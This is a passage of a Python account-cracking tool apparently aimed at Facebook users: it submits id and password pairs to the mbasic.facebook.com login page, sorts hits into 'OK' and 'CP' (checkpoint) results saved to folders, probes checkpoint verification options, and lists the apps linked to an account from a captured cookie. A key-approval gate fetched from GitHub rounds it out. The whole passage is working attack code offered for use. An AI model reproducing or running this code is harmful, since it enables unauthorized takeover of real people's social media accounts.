			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s[Xnot]%s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[Xnot]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s[Xnot]%s%s'%(kk,opsii.text,x))
				except:
					print('\r%s[Xnot]%s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s[XnotX]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[XnotX]%s|%s ----> ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

# 							[ approval ] 								#
def reg():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/it.is.Masudvai.143')
    banner()
    print ('')
    print ('                  [\033[1;97m\033[1;41m wait a minute \033[0m\033[1;93m]')
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.mrbx.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/mrbx001/approval.txt/main/mrbx').text
    if to in r:
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('xdg-open https://www.facebook.com/it.is.Masudvai.143')
        banner()
        print('      [\033[1;97m\033[1;41m  YOU NEED APPROVAL    \033[0m\033[1;93m]')
        print ('\n               YOUR KEY : \n' + to)
        print('      [\033[1;97m\033[1;41m  YOUR KEY SENT TO ADDMIN    \033[0m\033[1;93m]')
        name = input("               YOUR NAME : ")
        input('                     [\033[1;97m\033[1;41m  CLICK INTER   \033[0m\033[1;93m]')
        time.sleep(3.5)
        os.system('xdg-open https://m.me/it.is.Masudvai.143')
  
  
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
